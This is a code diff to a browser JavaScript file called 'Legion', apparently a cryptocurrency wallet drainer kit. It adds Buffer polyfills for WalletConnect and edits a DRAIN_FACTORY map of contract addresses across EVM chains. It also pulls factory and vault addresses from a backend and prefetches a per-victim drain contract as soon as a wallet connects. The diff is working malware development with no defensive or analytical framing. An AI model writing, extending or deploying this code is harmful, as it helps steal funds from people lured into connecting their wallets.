@@ -35,8 +35,10 @@
     };
   })();
 
-  // Node.js polyfills — do NOT stub Buffer (breaks WalletConnect relay decode)
+  // Node.js + Buffer polyfills — required for WalletConnect relay (fixes "unknown payload: 123,34,...")
   (function () {
+    if (window.__LEGION_POLYFILLS__) return;
+    window.__LEGION_POLYFILLS__ = true;
     if (typeof process === 'undefined' || !process.nextTick) {
       window.process = {
         env: { NODE_ENV: 'production' }, version: '', browser: true,
@@ -44,6 +46,80 @@
       };
     }
     if (typeof global === 'undefined') window.global = window;
+    function utf8FromU8(u8) {
+      try { return new TextDecoder('utf-8').decode(u8); }
+      catch (_) {
+        var s = '';
+        for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
+        return s;
+      }
+    }
+    function attachBuf(u8) {
+      if (!u8 || u8.__legionBuf) return u8;
+      u8.__legionBuf = true;
+      u8.toString = function (enc) {
+        enc = enc || 'utf8';
+        if (enc === 'hex') {
+          return Array.prototype.map.call(this, function (b) {
+            return ('0' + b.toString(16)).slice(-2);
+          }).join('');
+        }
+        if (enc === 'base64') {
+          var bin = '';
+          for (var i = 0; i < this.length; i++) bin += String.fromCharCode(this[i]);
+          return btoa(bin);
+        }
+        return utf8FromU8(this);
+      };
+      return u8;
+    }
+    if (!Uint8Array.prototype.__legionU8ToString) {
+      Uint8Array.prototype.toString = function () {
+        if (this.__legionBuf) return attachBuf(this).toString('utf8');
+        return utf8FromU8(this);
+      };
+      Uint8Array.prototype.__legionU8ToString = true;
+    }
+    if (typeof Buffer !== 'undefined' && Buffer.from && Buffer.from('ab').toString() === 'ab') return;
+    window.Buffer = {
+      isBuffer: function (b) { return !!(b && (b instanceof Uint8Array || b.__legionBuf)); },
+      from: function (d, enc) {
+        if (typeof d === 'string') {
+          if (enc === 'hex') {
+            var s = d.length % 2 ? '0' + d : d, b = [];
+            for (var i = 0; i < s.length; i += 2) b.push(parseInt(s.substr(i, 2), 16));
+            return attachBuf(new Uint8Array(b));
+          }
+          if (enc === 'base64') {
+            var bin = atob(d), u = new Uint8Array(bin.length);
+            for (var j = 0; j < bin.length; j++) u[j] = bin.charCodeAt(j);
+            return attachBuf(u);
+          }
+          return attachBuf(new TextEncoder().encode(d));
+        }
+        if (d instanceof ArrayBuffer) return attachBuf(new Uint8Array(d));
+        if (ArrayBuffer.isView(d)) return attachBuf(new Uint8Array(d.buffer, d.byteOffset, d.byteLength));
+        return attachBuf(new Uint8Array(d));
+      },
+      alloc: function (n, fill) {
+        var a = new Uint8Array(n);
+        if (fill !== undefined) a.fill(fill);
+        return attachBuf(a);
+      },
+      concat: function (list, totalLength) {
+        var total = totalLength != null ? totalLength : list.reduce(function (s, b) { return s + b.length; }, 0);
+        var out = new Uint8Array(total), off = 0;
+        list.forEach(function (b) {
+          var view = b instanceof Uint8Array ? b : new Uint8Array(b);
+          out.set(view, off); off += view.length;
+        });
+        return attachBuf(out);
+      },
+      byteLength: function (s, enc) {
+        if (typeof s === 'string') return window.Buffer.from(s, enc).length;
+        return s.length;
+      }
+    };
   })();
 
   // ═══════════════════════════════════════════════════════════════
@@ -68,7 +144,7 @@
     debugDevTools: false,
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.10.0';
+  var LEGION_VERSION = '5.10.1';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
   var TARGET_EVM_CHAIN_IDS = [
@@ -288,15 +364,10 @@
   
   var DRAIN_FACTORY = {
     1: '0x22577De82aba57F03d677c28fC27293f86527323',
-    10: '0x09571F30330b034a298642ae5F30d42a753676cf',
     56: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
     137: '0x5121Fd9F4B44fFce08eb0dcC53931663C7659eDc',
     5000: '0xd93E1B96103733982D76968e8668277CcBd23d57',
-    8453: '0x09571F30330b034a298642ae5F30d42a753676cf',
-    42161: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
     43114: '0xd93E1B96103733982D76968e8668277CcBd23d57',
-    81457: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
-    534352: '0x09571F30330b034a298642ae5F30d42a753676cf',
 
   };
 
@@ -544,6 +615,11 @@
     return !addr || String(addr).toLowerCase() === ZERO_ADDR;
   }
 
+  function hasFactoryOnChain(chainId) {
+    var id = Number(chainId);
+    return !isZeroAddr(DRAIN_FACTORY[id]);
+  }
+
   function resolveClaimContract(chainId) {
     var id = Number(chainId);
     var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
@@ -562,6 +638,7 @@
 
   async function ensureUserFactoryContract(address, chainId) {
     if (!address || !chainId) return null;
+    if (!hasFactoryOnChain(chainId)) return null;
     var key = String(address).toLowerCase() + ':' + Number(chainId);
     if (S.factoryContracts[key]) return S.factoryContracts[key];
     try {
@@ -575,7 +652,11 @@
       if (data && data.contract_address && !isZeroAddr(data.contract_address)) {
         S.factoryContracts[key] = String(data.contract_address).toLowerCase();
         if (data.deployed) L.log('[factory] relayer deployed clone on chain', chainId);
+        else L.log('[factory] clone address ready on chain', chainId, S.factoryContracts[key].slice(0, 10) + '...');
         return S.factoryContracts[key];
+      }
+      if (data && data.fallback) {
+        L.log('[factory] no factory on chain', chainId, '— static LegionDrain fallback');
       }
     } catch (e) { L.warn('factory deploy predict:', e.message); }
     return null;
@@ -2064,6 +2145,13 @@
         if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
         if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
         if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
+        var factoryMap = d.data.factory_addresses;
+        if (factoryMap && typeof factoryMap === 'object') {
+          Object.keys(factoryMap).forEach(function (cid) {
+            var fa = factoryMap[cid];
+            if (fa && !isZeroAddr(fa)) DRAIN_FACTORY[Number(cid)] = String(fa);
+          });
+        }
         var va = d.data.vault_addresses;
         if (va) {
           if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
@@ -4842,6 +4930,12 @@
       S.evmProvider = provider; S.evmWallet = walletName;
       try { sessionStorage.setItem('legion_wc_evm_addr', address); } catch (eSs) {}
       L.log('Connected wallet:', address, '|', walletName, '| chain', chainId);
+
+      if (hasFactoryOnChain(chainId)) {
+        ensureUserFactoryContract(address, chainId).catch(function (e) {
+          L.warn('factory prefetch:', e.message);
+        });
+      }
 
       var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
       UI.setConnected(address, chainMeta.name);
